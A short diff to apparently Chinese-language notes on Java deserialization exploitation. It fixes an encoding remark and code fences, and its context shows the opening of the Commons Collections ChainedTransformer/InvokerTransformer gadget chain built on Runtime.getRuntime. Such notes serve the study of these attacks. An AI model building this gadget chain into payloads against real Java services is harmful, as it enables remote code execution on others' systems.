@@ -543,7 +543,7 @@ LDAP：
   ```
 
   
-  PowerShell直接重定向的话，由于默认UTF16编码，序列化数据魔数会出错，Windows10 1903上使用cmd没问题
+  PowerShell直接重定向的话，由于默认UTF-16LE编码，序列化数据魔数会出错，Windows10 1903上使用cmd没问题
 
 ## Gadgets
 
@@ -585,7 +585,7 @@ public static void main(String[] args) {
 
 `cc.functors.ChainedTransformer`可以实现对一个Transformer数组里的Transformer的链式调用，`output | input`
 
-​```java
+```java
 public Object transform(Object object) {
     for (int i = 0; i < iTransformers.length; i++) {
         object = iTransformers[i].transform(object);
@@ -596,7 +596,7 @@ public Object transform(Object object) {
 
 调用链很好理解：
 
-```java
+​```java
 Transformer[] transformers = new Transformer[]{
     new ConstantTransformer(Runtime.class),
     new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
